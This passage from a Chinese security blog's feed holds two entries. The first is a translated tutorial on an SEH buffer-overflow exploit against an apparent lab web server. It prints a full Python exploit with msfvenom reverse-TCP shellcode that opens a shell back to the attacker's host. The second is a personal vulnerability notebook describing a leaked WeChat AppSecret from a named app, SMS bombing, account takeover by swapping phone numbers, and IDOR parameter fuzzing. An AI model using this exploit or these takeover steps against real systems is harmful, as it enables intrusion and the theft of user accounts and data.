class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00\x0d\x0a\x0c\x20\x25\x2b\x2f\x5c</span><br></pre></td></tr></table></figure><h3 id="2-2-4-查找POP-POP-RET指令"><a href="#2-2-4-查找POP-POP-RET指令" class="headerlink" title="2.2.4 查找POP POP RET指令"></a>2.2.4 查找POP POP RET指令</h3><p>在本文中，我已经对此进行了广泛的介绍，因此，我将直接进入操作并找到包含<code>pop pop ret</code>指令的模块。</p><p>当然，我们将再次使用<strong>mona</strong>通过以下方便的命令来完成此操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona seh</span><br></pre></td></tr></table></figure><p>当然，这里的目标是找到一个未经任何安全限制（例如<strong>ASLR</strong>，<strong>Safe SEH</strong>等）编译的模块。</p><p>您会注意到，在运行时，<code>!mona seh</code>它会在日志窗口中显示10个结果，但没有一个真正适合您，很容易在这里感到困惑，并开始怀疑是否还有要使用的模块。然而！如果检查<code>seh.txt</code>位于<strong>mona</strong>工作目录中的<code>.txt</code>文件，您会发现一个非常大的文件，其中包含数百个，甚至数千个可用模块。</p><p>以我为例，我滚动浏览了所有以开头的模块，<code>00</code>以避免无意中在缓冲区中实现流氓<strong>空字节</strong>。</p><p>我选择的选项是 <code>0x1000108b</code></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162557.png" class="lozad"></p><p>现在，我将此值添加到我的python脚本中的<strong>SEH</strong>变量中，并执行它以验证我的想法是正确的，并且执行按预期进行。</p><p><strong>更新的Python脚本</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;B&quot;*4</span><br><span class="line">seh = &quot;\x99\xab\x01\x10&quot; #0x1001ab99 pop pop ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * 4061</span><br><span class="line">print &quot;[*] Starting to GET Variable&quot;</span><br><span class="line">buffer += nseh #BBBB</span><br><span class="line">buffer += seh #pop pop ret</span><br><span class="line">junk = &quot;D&quot;*(10000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">payload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;</span><br><span class="line">payload += &quot;Host: bof.local\r\n&quot;</span><br><span class="line">payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;</span><br><span class="line">payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,80))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 80&quot;</span><br><span class="line">s.send((payload))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload)</span><br></pre></td></tr></table></figure><p>执行后检查<strong>抗扰性</strong>显示<strong>SEH Handler</strong>现在已被我们的<code>pop pop ret</code>小工具（也称为<strong>1001ab99）</strong>的内存地址覆盖</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162608.png" class="lozad"></p><p>而且，如果我们不通过<strong>Shift + F9</strong>将异常传递给程序，则会将<strong>nSEH</strong><code>pop pop ret</code>的值和<strong>nSEH</strong>的值放置在<strong>EIP寄存器中以</strong>备执行。<strong>答对了！</strong></p><p>在这种情况下，<strong>053A6FAC</strong>是堆栈中<strong>nSEH</strong>的地址，因此我们执行此位置的任何内容都将被执行。如下面的屏幕截图所示。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162617.png" class="lozad"></p><h3 id="2-2-5-生成Shellcode"><a href="#2-2-5-生成Shellcode" class="headerlink" title="2.2.5 生成Shellcode"></a>2.2.5 生成Shellcode</h3><p>现在与VulnServer不同，在缓冲区<strong>之后</strong>我们可以使用的空间非常有限- 在这种情况下，精确到<strong>52字节</strong>，在我们的<strong>nSEH</strong>和<strong>SEH</strong>值之后，我们<strong>还有</strong>很多空间，精确到<strong>931字节</strong>。</p><p>现在，只要对我们的shell代码进行一点编码，我们就应该能够将我们的shellcode放在这里，并<code>Short JMP</code>在<strong>nSEH</strong>指针中添加一些代码直接跳入其中。</p><p>但是，首先让我们使用可信任的<strong>MSFVenom</strong>生成一些shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m0chan@kali:/&gt; msfvenom -p windows/shell/reverse_tcp LHOST=172.16.10.171 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b &quot;\x00\x0d\x0a\x0c&quot;</span><br></pre></td></tr></table></figure><p>您可能会注意到，这次我选择了分段式负载，而无段式只是为了帮助减小负载大小。</p><h3 id="2-2-6-最终利用"><a href="#2-2-6-最终利用" class="headerlink" title="2.2.6 最终利用"></a>2.2.6 最终利用</h3><p>跳转到shell代码并执行最终的shellcode。为了安全起见，现在要做的所有工作就是将我们的shell代码<code>D</code>与一些缓冲区一起放在缓冲区中<code>NOPS</code>，并从<strong>nSEH</strong>执行<strong>6字节的</strong>跳转，该跳转将<strong>落入</strong>我们的NOP Sled并直接进入shellcode。</p><p>我们可以做到这一点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nseh = &quot;\xeb\x06\x90\x90&quot;</span><br></pre></td></tr></table></figure><p>现在我们的最终漏洞利用将如下所示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;\xeb\x06\x90\x90&quot;</span><br><span class="line">seh = &quot;\x99\xab\x01\x10&quot; #0x1001ab99 pop pop ret</span><br><span class="line"></span><br><span class="line">#msfvenom -p windows/shell/reverse_tcp LHOST=172.16.10.171 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b &quot;\x00\x0d\x0a\x0c\x20\x25\x2b\x2f\x5c&quot;</span><br><span class="line"></span><br><span class="line">shellcodenops = &quot;\x90\x90\x90\x90&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">&quot;\xbd\xe0\x3c\x1c\xcb\xda\xc2\xd9\x74\x24\xf4\x5a\x31\xc9\xb1&quot;</span><br><span class="line">&quot;\x5b\x31\x6a\x14\x83\xea\xfc\x03\x6a\x10\x02\xc9\xe0\x23\x40&quot;</span><br><span class="line">&quot;\x32\x19\xb4\x24\xba\xfc\x85\x64\xd8\x75\xb5\x54\xaa\xd8\x3a&quot;</span><br><span class="line">&quot;\x1f\xfe\xc8\xc9\x6d\xd7\xff\x7a\xdb\x01\x31\x7a\x77\x71\x50&quot;</span><br><span class="line">&quot;\xf8\x85\xa6\xb2\xc1\x46\xbb\xb3\x06\xba\x36\xe1\xdf\xb1\xe5&quot;</span><br><span class="line">&quot;\x16\x6b\x8f\x35\x9c\x27\x1e\x3e\x41\xff\x21\x6f\xd4\x8b\x78&quot;</span><br><span class="line">&quot;\xaf\xd6\x58\xf1\xe6\xc0\xbd\x3f\xb0\x7b\x75\xb4\x43\xaa\x47&quot;</span><br><span class="line">&quot;\x35\xef\x93\x67\xc4\xf1\xd4\x40\x36\x84\x2c\xb3\xcb\x9f\xea&quot;</span><br><span class="line">&quot;\xc9\x17\x15\xe9\x6a\xdc\x8d\xd5\x8b\x31\x4b\x9d\x80\xfe\x1f&quot;</span><br><span class="line">&quot;\xf9\x84\x01\xf3\x71\xb0\x8a\xf2\x55\x30\xc8\xd0\x71\x18\x8b&quot;</span><br><span class="line">&quot;\x79\x23\xc4\x7a\x85\x33\xa7\x23\x23\x3f\x4a\x30\x5e\x62\x03&quot;</span><br><span class="line">&quot;\xf5\x53\x9d\xd3\x91\xe4\xee\xe1\x3e\x5f\x79\x4a\xb7\x79\x7e&quot;</span><br><span class="line">&quot;\xdb\xdf\x79\x50\x63\x8f\x87\x51\x94\x86\x43\x05\xc4\xb0\x62&quot;</span><br><span class="line">&quot;\x26\x8f\x40\x8a\xf3\x3a\x4a\x1c\x50\xaa\x40\x77\xc0\xc9\x54&quot;</span><br><span class="line">&quot;\x86\xaa\x47\xb2\xd8\x9c\x07\x6a\x99\x4c\xe8\xda\x71\x87\xe7&quot;</span><br><span class="line">&quot;\x05\x61\xa8\x2d\x2e\x08\x47\x98\x07\xa5\xfe\x81\xd3\x54\xfe&quot;</span><br><span class="line">&quot;\x1f\x9e\x57\x74\xaa\x5f\x19\x7d\xdf\x73\x4e\x1a\x1f\x8b\x8f&quot;</span><br><span class="line">&quot;\x8f\x1f\xe1\x8b\x19\x77\x9d\x91\x7c\xbf\x02\x69\xab\xc3\x44&quot;</span><br><span class="line">&quot;\x95\x2a\xf2\x3f\xa0\xb8\xba\x57\xcd\x2c\x3b\xa7\x9b\x26\x3b&quot;</span><br><span class="line">&quot;\xcf\x7b\x13\x68\xea\x83\x8e\x1c\xa7\x11\x31\x75\x14\xb1\x59&quot;</span><br><span class="line">&quot;\x7b\x43\xf5\xc5\x84\xa6\x85\x02\x7a\x35\xa2\xaa\x13\xc5\xf2&quot;</span><br><span class="line">&quot;\x4a\xe4\xaf\xf2\x1a\x8c\x24\xdc\x95\x7c\xc5\xf7\xfd\x14\x4c&quot;</span><br><span class="line">&quot;\x96\x4c\x84\x51\xb3\x11\x18\x52\x30\x8a\xab\x29\x39\x2d\x4c&quot;</span><br><span class="line">&quot;\xce\x53\x4a\x4c\xcf\x5b\x6c\x70\x06\x62\x1a\xb7\x9b\xd1\x05&quot;</span><br><span class="line">&quot;\x2a\x31\x2c\xae\xf3\xd0\x8d\xb3\x03\x0f\xd1\xcd\x87\xa5\xaa&quot;</span><br><span class="line">&quot;\x29\x97\xcc\xaf\x76\x1f\x3d\xc2\xe7\xca\x41\x71\x07\xdf&quot;)</span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * 4061</span><br><span class="line">print &quot;[*] Starting to GET Variable&quot;</span><br><span class="line">buffer += nseh #BBBB</span><br><span class="line">buffer += seh #pop pop ret</span><br><span class="line">buffer += shellcodenops</span><br><span class="line">buffer += shellcode</span><br><span class="line">junk = &quot;D&quot;*(10000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">payload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;</span><br><span class="line">payload += &quot;Host: bof.local\r\n&quot;</span><br><span class="line">payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;</span><br><span class="line">payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,80))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 80&quot;</span><br><span class="line">s.send((payload))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload)</span><br></pre></td></tr></table></figure><p>与<strong>VulnServer</strong>相似-我还在Visio中创建了一个漂亮的小图，以演示该漏洞利用过程并从较高的角度进行跳转。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162630.png" class="lozad"></p><h1 id="0x03-参考资料-资源"><a href="#0x03-参考资料-资源" class="headerlink" title="0x03 参考资料/资源"></a>0x03 参考资料/资源</h1><p>特别鸣谢以下所有民众：</p><p><a href="https://h0mbre.github.io/" target="_blank" rel="noopener">https://h0mbre.github.io</a></p><p><a href="https://www.securitysift.com/" target="_blank" rel="noopener">https://www.securitysift.com</a></p><p><a href="https://captmeelo.com/" target="_blank" rel="noopener">https://captmeelo.com</a></p><p><a href="https://www.fuzzysecurity.com/" target="_blank" rel="noopener">https://www.fuzzysecurity.com</a></p><p><a href="https://securitychops.com/" target="_blank" rel="noopener">https://securitychops.com</a></p><p><a href="https://nutcrackerssecurity.github.io/Windows4.html" target="_blank" rel="noopener">https://nutcrackerssecurity.github.io/Windows4.html</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 翻译 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的漏洞库（不断跟新中）</title>
      <link href="/2019/10/11/%E6%88%91%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%BA%93/"/>
      <url>/2019/10/11/%E6%88%91%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>为了积累在工作中碰到的一些漏洞以及在一些文章中看到的一些漏洞，决定采用文本的方式记录下来，一来方便自己查看，二来也可以方便自己以后写报告。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011165501.png" class="lozad"></p><a id="more"></a><h1 id="0x01-web漏洞"><a href="#0x01-web漏洞" class="headerlink" title="0x01 web漏洞"></a>0x01 web漏洞</h1><h2 id="1-1-SSRF"><a href="#1-1-SSRF" class="headerlink" title="1.1 SSRF"></a>1.1 SSRF</h2><h3 id="1-1-1-漏洞描述"><a href="#1-1-1-漏洞描述" class="headerlink" title="1.1.1 漏洞描述"></a>1.1.1 漏洞描述</h3><h3 id="1-1-2-风险分析"><a href="#1-1-2-风险分析" class="headerlink" title="1.1.2 风险分析"></a>1.1.2 风险分析</h3><h3 id="1-1-3-风险等级"><a href="#1-1-3-风险等级" class="headerlink" title="1.1.3 风险等级"></a>1.1.3 风险等级</h3><h3 id="1-1-4-修复建议"><a href="#1-1-4-修复建议" class="headerlink" title="1.1.4 修复建议"></a>1.1.4 修复建议</h3><h2 id="1-2-CSRF"><a href="#1-2-CSRF" class="headerlink" title="1.2 CSRF"></a>1.2 CSRF</h2><h3 id="1-2-1-漏洞描述"><a href="#1-2-1-漏洞描述" class="headerlink" title="1.2.1 漏洞描述"></a>1.2.1 漏洞描述</h3><p>CSRF的形成是因为攻击者较容易猜测某些Web应用一个特定敏感操作的所有细节。利用浏览器能保存会话cookie等凭证，并会自动发送的特点，攻击者可以创建一个恶意web页面生成伪造请求，再利用社会工程学的手段诱惑受害者进行操作，从而在被攻击Web应用上伪装成受害者进行特定敏感操作，如修改密码、通信方式甚至转账等。</p><h3 id="1-2-2-风险分析"><a href="#1-2-2-风险分析" class="headerlink" title="1.2.2 风险分析"></a>1.2.2 风险分析</h3><p>可能会窃取或操纵客户会话和 cookie，它们可能用于模仿合法用户，从而使黑客能够以该用户身份查看或变更用户记录以及执行事务。</p><h3 id="1-2-3-风险等级"><a href="#1-2-3-风险等级" class="headerlink" title="1.2.3 风险等级"></a>1.2.3 风险等级</h3><p>中危</p><h3 id="1-2-4-修复建议"><a href="#1-2-4-修复建议" class="headerlink" title="1.2.4 修复建议"></a>1.2.4 修复建议</h3><p>避免 CSRF 攻击，每个请求都应该包含唯一标识，它是攻击者所无法猜测的参数，并且该参数不存在于cookie之中。可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端验证该token。若请求中没有token或token内容不正确，便废弃请求。</p><h2 id="1-3-未授权访问"><a href="#1-3-未授权访问" class="headerlink" title="1.3 未授权访问"></a>1.3 未授权访问</h2><h3 id="1-3-1-漏洞描述"><a href="#1-3-1-漏洞描述" class="headerlink" title="1.3.1 漏洞描述"></a>1.3.1 漏洞描述</h3><p>未授权访问指需要安全配置或权限认证的授权页面可以直接访问。</p><h3 id="1-3-2-风险分析"><a href="#1-3-2-风险分析" class="headerlink" title="1.3.2 风险分析"></a>1.3.2 风险分析</h3><h3 id="1-3-3-风险等级"><a href="#1-3-3-风险等级" class="headerlink" title="1.3.3 风险等级"></a>1.3.3 风险等级</h3><p>为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库、网站目录等敏感信息泄露</p><h3 id="1-3-4-修复建议"><a href="#1-3-4-修复建议" class="headerlink" title="1.3.4 修复建议"></a>1.3.4 修复建议</h3><p>未授权访问页面做Session认证，并对用户访问的每一个URL做身份鉴别，正确地校验用户ID及Token</p><h2 id="1-4-微信公众号秘钥泄露"><a href="#1-4-微信公众号秘钥泄露" class="headerlink" title="1.4 微信公众号秘钥泄露"></a>1.4 微信公众号秘钥泄露</h2><h3 id="1-4-1-漏洞描述"><a href="#1-4-1-漏洞描述" class="headerlink" title="1.4.1 漏洞描述"></a>1.4.1 漏洞描述</h3><p>可以通过反编译APK文件或者对APK文件进行逆向分析查看到微信的AppID和AppSecret。Appsecret 是应用接口使用密钥，泄漏后将可能导致应用数据泄漏、应用的用户数据泄漏等高风险后果；存储在客户端，极有可能被恶意窃取（如反编译获取Appsecret）</p><h3 id="1-4-2-风险分析"><a href="#1-4-2-风险分析" class="headerlink" title="1.4.2  风险分析"></a>1.4.2  风险分析</h3><p>使用这对AppID和AppSecret，可以在“微信公众平台接口调试工具”上获取access_token，然后利用这个access_token，可以进一步获取用户信息、给用户发送各类信息等</p><h3 id="1-4-3-风险等级"><a href="#1-4-3-风险等级" class="headerlink" title="1.4.3 风险等级"></a>1.4.3 风险等级</h3><p>低</p><h3 id="1-4-4-修复建议"><a href="#1-4-4-修复建议" class="headerlink" title="1.4.4 修复建议"></a>1.4.4 修复建议</h3><p>删除客户端的Appsecret ，如果确实需要，可以将Appsecret、用户数据（如access_token）放在App云端服务器，由云端中转接口调用请求</p><h3 id="1-4-5-漏洞案例"><a href="#1-4-5-漏洞案例" class="headerlink" title="1.4.5 漏洞案例"></a>1.4.5 漏洞案例</h3><p>通过逆向分析得到“大闹三国”的 微信公众号账号AppID和AppSecret：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191106174035.png" class="lozad"></p><p>获取公众号access_token</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191106174056.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191106174103.png" class="lozad"></p><p>获取公众号粉丝的openid</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191106174120.png" class="lozad"></p><p>获取公众号粉丝的昵称、地区等其他信息</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191106174151.png" class="lozad"></p><h1 id="0x02-逻辑漏洞"><a href="#0x02-逻辑漏洞" class="headerlink" title="0x02 逻辑漏洞"></a>0x02 逻辑漏洞</h1><h2 id="2-1-短信炸弹"><a href="#2-1-短信炸弹" class="headerlink" title="2.1 短信炸弹"></a>2.1 短信炸弹</h2><h3 id="2-1-1-漏洞描述"><a href="#2-1-1-漏洞描述" class="headerlink" title="2.1.1 漏洞描述"></a>2.1.1 漏洞描述</h3><h3 id="2-1-2-风险分析"><a href="#2-1-2-风险分析" class="headerlink" title="2.1.2 风险分析"></a>2.1.2 风险分析</h3><h3 id="2-1-3-风险等级"><a href="#2-1-3-风险等级" class="headerlink" title="2.1.3 风险等级"></a>2.1.3 风险等级</h3><h3 id="2-1-4-修复建议"><a href="#2-1-4-修复建议" class="headerlink" title="2.1.4 修复建议"></a>2.1.4 修复建议</h3><h3 id="2-1-5-漏洞案例"><a href="#2-1-5-漏洞案例" class="headerlink" title="2.1.5 漏洞案例"></a>2.1.5 漏洞案例</h3><h4 id="【案例一】"><a href="#【案例一】" class="headerlink" title="【案例一】"></a>【案例一】</h4><p>登陆处，这⾥对发送验证码做了两个限制：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028164045.png" class="lozad"></p><blockquote><p>js做的限制</p><p>1.限制发送周期<br>2.需要填写⼿机号和正确的验证码</p></blockquote><p>这⾥的两个限制并不能杜绝短信炸弹：</p><blockquote><p>1.在js⾥限制发送周期是没⽤的，包重放就绕过了<br>2.验证码在⽣命周期内可以反复使⽤</p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191106175239.png" class="lozad"></p><h2 id="2-2-登录任意账户"><a href="#2-2-登录任意账户" class="headerlink" title="2.2 登录任意账户"></a>2.2 登录任意账户</h2><h3 id="2-2-1-漏洞描述"><a href="#2-2-1-漏洞描述" class="headerlink" title="2.2.1 漏洞描述"></a>2.2.1 漏洞描述</h3><h3 id="2-2-2-风险分析"><a href="#2-2-2-风险分析" class="headerlink" title="2.2.2 风险分析"></a>2.2.2 风险分析</h3><h3 id="2-2-3-风险等级"><a href="#2-2-3-风险等级" class="headerlink" title="2.2.3 风险等级"></a>2.2.3 风险等级</h3><h3 id="2-2-4-修复建议"><a href="#2-2-4-修复建议" class="headerlink" title="2.2.4 修复建议"></a>2.2.4 修复建议</h3><h3 id="2-2-5-漏洞案例"><a href="#2-2-5-漏洞案例" class="headerlink" title="2.2.5 漏洞案例"></a>2.2.5 漏洞案例</h3><h4 id="【案例一】-1"><a href="#【案例一】-1" class="headerlink" title="【案例一】"></a>【案例一】</h4><p>【⽤户注册界⾯】</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028163802.png" class="lozad"></p><p>在输⼊⼿机号后，⿏标焦点转移到其它输⼊框，此时⽹⻚会发送⼀个ajax请求，验证⼿机号是否注册：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028163921.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028163859.png" class="lozad"></p><p>⼿机号已注册返回flag为0，未注册flag为1，可以burp暴⼒跑出已注册⼿机号</p><p>【登陆处】</p><p>1.先输⼊⾃⼰的⼿机号，接收验证码</p><p>2.替换要登录的⼿机号</p><p>3.将⾃⼰⼿机号收到的验证码输⼊，即可登录他⼈账号</p><p>有两种登陆⽅式，我们选⼿机验证码登陆</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028164112.png" class="lozad"></p><p>这⾥填我们⾃⼰的⼿机号，收到验证码后，把⼿机号改为前⼀步跑出的已注册⽤户，验证码⽤我们收到的，成功登陆：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028164151.png" class="lozad"></p><h2 id="2-3-任意用户注册"><a href="#2-3-任意用户注册" class="headerlink" title="2.3 任意用户注册"></a>2.3 任意用户注册</h2><h3 id="2-3-1-漏洞描述"><a href="#2-3-1-漏洞描述" class="headerlink" title="2.3.1 漏洞描述"></a>2.3.1 漏洞描述</h3><h3 id="2-3-2-风险分析"><a href="#2-3-2-风险分析" class="headerlink" title="2.3.2 风险分析"></a>2.3.2 风险分析</h3><h3 id="2-3-3-风险等级"><a href="#2-3-3-风险等级" class="headerlink" title="2.3.3 风险等级"></a>2.3.3 风险等级</h3><h3 id="2-3-4-修复建议"><a href="#2-3-4-修复建议" class="headerlink" title="2.3.4 修复建议"></a>2.3.4 修复建议</h3><h3 id="2-3-5-漏洞案例"><a href="#2-3-5-漏洞案例" class="headerlink" title="2.3.5 漏洞案例"></a>2.3.5 漏洞案例</h3><h4 id="【案例一】-2"><a href="#【案例一】-2" class="headerlink" title="【案例一】"></a>【案例一】</h4><p>如果输⼊未注册的⼿机号，登陆，系统会默认这次登陆⾏为等同为注册</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028164001.png" class="lozad"></p><p>登陆前，显⽰为未注册</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028164013.png" class="lozad"></p><p>登陆后，⼿机号已注册，⼿机号原主⼈⽆法注册了</p><h2 id="2-4-越权访问"><a href="#2-4-越权访问" class="headerlink" title="2.4 越权访问"></a>2.4 越权访问</h2><p>2.4.1 漏洞描述</p><p>2.4.2 风险分析</p><p>2.4.5 漏洞案例</p><p>【案例一】</p><p>对一个网站做测试的时候发现了这样一条请求：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028163710.png" class="lozad"></p><p>一开始的想法是变为 GET 请求（可行），然后增加 JSONP 劫持的回调参数。。。（失败）,之前也有人问我怎么去做参数字典的收集：<br>A. 注意网站参数的命名方式</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028163735.png" class="lozad"></p><p>大写、英文<br>B. 返回变参数（注意值都为 B 用户 也就是你需要准备两个用户）<br>上面所述的返回信息中包含了很多“参数”，可生成如下：</p><blockquote><p>userid=B 用户 id<br>login=B 用户名<br>password=B 用户密码<br>mobilenum=B 用户手机号<br>email=B 用户邮箱</p></blockquote><p>C. 整合</p><p>A 规则+B 收集=C 整合<br>最后变成如下的字典：</p><blockquote><p>USERID=B 用户 id<br>LOGIN=B 用户名<br>PASSWORD=B 用户密码<br>MOBILENUM=B 用户手机号<br>EMAIL=B 用户邮箱</p></blockquote><p>然后 Burp Intruder 模块开启，导入字典(这里将参数设在 POST 请求正文)，Start Fuzz：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028163750.png" class="lozad"></p><p>测试结果发现使用 LOGIN 参数可以成功的从 A 用户的个人信息越权获取到 B 用户的个人信息～</p><h1 id="0x03-APP漏洞"><a href="#0x03-APP漏洞" class="headerlink" title="0x03 APP漏洞"></a>0x03 APP漏洞</h1><h1 id="0x04-主机漏洞"><a href="#0x04-主机漏洞" class="headerlink" title="0x04 主机漏洞"></a>0x04 主机漏洞</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用telegram搭建一个rss订阅机器人</title>
      <link href="/2019/10/10/%E4%BD%BF%E7%94%A8telegram%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AArss%E8%AE%A2%E9%98%85%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
      <url>/2019/10/10/%E4%BD%BF%E7%94%A8telegram%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AArss%E8%AE%A2%E9%98%85%E6%9C%BA%E5%99%A8%E4%BA%BA/</url>
      
